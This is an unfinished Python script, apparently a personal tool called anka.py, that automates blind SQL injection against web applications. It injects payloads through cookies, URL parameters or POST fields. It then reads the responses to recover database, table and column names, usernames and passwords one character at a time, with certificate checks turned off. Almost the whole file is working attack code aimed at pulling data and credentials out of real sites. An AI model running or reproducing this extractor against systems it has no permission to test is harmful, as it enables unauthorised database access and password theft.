#!/usr/bin/env python
# -*- coding: utf-8 -*-

""" [ UNDER CONSTRUCTION ] ATTENTION I RECENTLY ADDED THIS HEADER, IT MAY NOT BE ACCURATE YET, PLEASE REVIEW IT BEFORE TRUSTING THE CONTENTS OF IT. 
anka.py AKA 安全鍵 (Security Key)  ### think about a better name, perhaps use this as my company (final tool name) and perhaps make this script just a sub part of it


## I think that for now is anka, but perhaps this tool will need to change for a SQL related name and make anka the upper tool that uses this one.

============================

安全鍵 (Security Key) is a security tool that aids in the automation to probe for SQL injection attacks.

Author: 9xh4kv
Email: 9xh4kv@gmail.com
GitHub: https://github.com/9xh4kv.git/9xh4kv   # FIX THISSS

Usage:
    $ python anka.py [options]

Options:
    -h, --help        Show this help message and exit
    -v, --version     Show the version of the script

Description:
    Provide a more detailed description of what your script/tool does.
    You can include usage examples and additional information here.
attempt:
    -a, --attack      Attack type
    -u, --url         URL
    -p, --payload     Payload
    -m, --pattern     Matching words  ### I AM NOT SURE THIS MATCHES THE REAL SCRIPT, EITHERWAY FIND A BETTER FLAG NAME BECAUSE THIS IS CONFUSING, MAKE IT SMOOTHER
    -c, --cookies     Cookies value   [ UNDER CONSTRUCTION ]

    [ UNDER CONSTRUCTION ]
"""


import argparse
import ast
import copy
import sys
import urllib

import requests
import urllib3

#---
# please remember that in case of ORACLE db, tables and columns names might be case sensitve
# this script is built to only find columns and tables with lowercase.

# Create the argument parser
#parser = argparse.ArgumentParser(description='Script description')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add the command line arguments
# parser.add_argument('-a', '--attack', help='Attack type', required=True)
# parser.add_argument('-u', '--url', help='URL', required=True)
# parser.add_argument('-p', '--payload', help='Payload', required=True)
# parser.add_argument('-m', '--pattern', help='Matching words', required=True)
# parser.add_argument('-c', '--cookies', help='Cookies value')
# # Parse the command line arguments
# args = parser.parse_args()

# # Access the argument values
# attack = args.attack
# url = args.url
# payload = args.payload
# pattern = args.pattern
# cookies = {}

# if args.cookies:
#     cookiesValue = args.cookies.split(';')
#     for value in cookiesValue:
#         key, value = value.split('=')
#         cookies[key.strip()] = value.strip()
#-------------------------------------------------------------
# Attack types:
# -d: Database               -C: Cookies
# -t: Table                  -U: URL
# -c: Column                 -P: Param
# -v: Value
# -u: Username
# -p: Password
#-------------------------------------------------------------
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'} # ATTENTION BURPS NEEDS TO BE RUNNING FOR THIS TO WORK OR ELSE YOU GET SCRIPT ERROR
proxies=None # cancel this when using proxies above
#================================================================

attack = ""
url = ""
cookies = None
params = None
pattern = ""
search_uppercase = False
payload = ""

#================================================================


def sql_injection(attack, url, payload, pattern, cookies, char, params=None):
    #Please be aware:
    #this goes from the logic that no element name has only 1 letter. it checks for x% initially then if the two letters exist within the db, it checks if those two letters are 1 element.
    #
    modifiedPayload = payload.replace("^FUZZ^", char + "%") 
    encodedPayload = urllib.parse.quote(modifiedPayload)    
    if 'C' in attack:
        modifiedCookies = copy.deepcopy(cookies)
        for key, value in modifiedCookies.items():
            modifiedCookies[key] = value.replace('^FUZZ^', encodedPayload)
        request = requests.get(url, cookies=modifiedCookies, verify=False, proxies=proxies)
        if pattern in request.text:
            modifiedPayload = payload.replace("^FUZZ^", char)
            encodedPayload = urllib.parse.quote(modifiedPayload)
            modifiedCookies = copy.deepcopy(cookies)
            for key, value in modifiedCookies.items():
                modifiedCookies[key] = value.replace("^FUZZ^", encodedPayload)
            request = requests.get(url, cookies=modifiedCookies, verify=False, proxies=proxies)
            if pattern in request.text:
                return True, True
            return True, False
        return False, False
    elif 'U' in attack:
        modifiedUrl = url.replace('^FUZZ^', encodedPayload)
        request = requests.get(modifiedUrl, cookies=cookies, verify=False, proxies=proxies)
        if pattern in request.text:
            modifiedPayload = payload.replace("^FUZZ^", char)
            encodedPayload = urllib.parse.quote(modifiedPayload)
            modifiedUrl = url.replace('^FUZZ^', encodedPayload)
            request = requests.get(modifiedUrl, cookies=cookies, verify=False, proxies=proxies)
            if pattern in request.text:
                return True, True
            return True, False
        return False, False
    elif 'P' in attack:
        
        modifiedParam = copy.deepcopy(params)
        for key, value in modifiedParam.items():
            # Attention non encodedPayload is being attached! change according to your needs
            # I suspect that this parameter doesn't need to be encoded, check with further testing.
            modifiedParam[key] = value.replace('^FUZZ^', modifiedPayload) # encodedPayload for url encoded
        request = requests.post(url, cookies=cookies, data=modifiedParam, verify=False, proxies=proxies)

        if pattern in request.text:
            modifiedPayload = payload.replace("^FUZZ^", char)
            # ATTENTION, encoding the payload before was giving me errors.
            # will likely to need to change this later.
            #encodedPayload = urllib.parse.quote(modifiedPayload)
            modifiedParam = copy.deepcopy(params)
            for key, value in modifiedParam.items():
                modifiedParam[key] = value.replace("^FUZZ^", modifiedPayload) # changed from encodedPayload to modifiedPayload
            request = requests.post(url, cookies=cookies, data=modifiedParam, verify=False, proxies=proxies)
            if pattern in request.text:
                return True, True
            return True, False
        return False, False
            
def getSchemaInfo(attack, url, payload, pattern, cookies=None, params=None):
    validList = [] # lists of valid entries that needs to be probed for further characters
    elementList = [] # lists of all entries found
  
    for initialChar in range (33, 122): # checking only lower letter, change later.   
        if not search_uppercase and initialChar in range(65, 91):
            continue  
        if initialChar in [37, 95]: # this ignores % and _ as initial char.
            continue
        initialChar = chr(initialChar)
        isChar, isFull = sql_injection(attack, url, payload, pattern, cookies, initialChar, params)
        if isFull:
            elementList.append(initialChar)
            if isChar:
                validList.append(initialChar)
                sys.stdout.write('\r' + 'Found: [' + ', '.join(elementList) + '] Valid list: ['+ ', '.join(validList) + ']')
                sys.stdout.flush()
        elif isChar:
            validList.append(initialChar)
    print("initialChar list found: ", validList)
    while validList:
        initialChar = validList.pop(0)
        for char in range (33, 122):
            if not search_uppercase and char in range(65, 91):
                continue
            if char in [37, 95]:
                newChar = initialChar + "\\" + chr(char) # this add \ before % and _ to escape them in the SQL query.
            else:
                newChar = initialChar + chr(char)
            isChar, isFull = sql_injection(attack, url, payload, pattern, cookies, newChar, params)
            if isFull:
                elementList.append(newChar)
            if isChar:
                validList.append(newChar)
                sys.stdout.write('\r' + 'Found: [' + ', '.join(elementList) + ']')
                #The line below breaks the output when the list is too long, I need to find a way to fix it.
                sys.stdout.write('\nValid list: ['+ ', '.join(validList) + ']' + '\033[1A') # '\033[1A' Move cursor up 1 [fix breaking issue]     
                #Fix the code above, it is breaking the output when the list is too long.
                
                sys.stdout.flush()
    sys.stdout.write('\r' + 'Found: [' + ', '.join(elementList) + ']')

def getPwd(attack, url, payload, pattern, cookies=None, params=None):
    extractedPwd = ""
    passwordFound = False
    while not passwordFound:   
        for char in range (33, 123):
            if char in [37, 95]:
                continue
            if not search_uppercase and char in range(65, 91):
                continue
            char = extractedPwd + chr(char)
            isValid, isFull = sql_injection(attack, url, payload, pattern, cookies, char, params)
            if isFull:
                passwordFound = True
                sys.stdout.write('\r' +'Extracted Password: ' + char)
                sys.stdout.flush()
                break
            elif isValid:          
                extractedPwd = char
                sys.stdout.write('\r' + extractedPwd)
                sys.stdout.flush()
            else:
                sys.stdout.write('\r' + char)

#maybe make it switch statement instead (need to find how to deal case if 'x' in attack)
if  'd' in attack:
    print('Finding Database Names...')
    getSchemaInfo(attack, url, payload, pattern, cookies, params)
elif 't' in attack:
    print('Finding Table Names...')
    getSchemaInfo(attack, url, payload, pattern, cookies, params)
elif 'c' in attack:
    print('Finding Column Names...')
    getSchemaInfo(attack, url, payload, pattern, cookies, params)
elif 'v' in attack:
    print("Finding Value...")   # Not sure if this goes to param attack or what, need to check later
    getSchemaInfo(attack, url, payload, pattern, cookies, params)
elif 'p' in attack:
    print('Finding Password...\n')
    getPwd(attack, url, payload, pattern, cookies, params)
elif 'u' in attack:
    print('Finding Valid Usernames...')
    getSchemaInfo(attack, url, payload, pattern, cookies, params)
else:
    print('fuu')


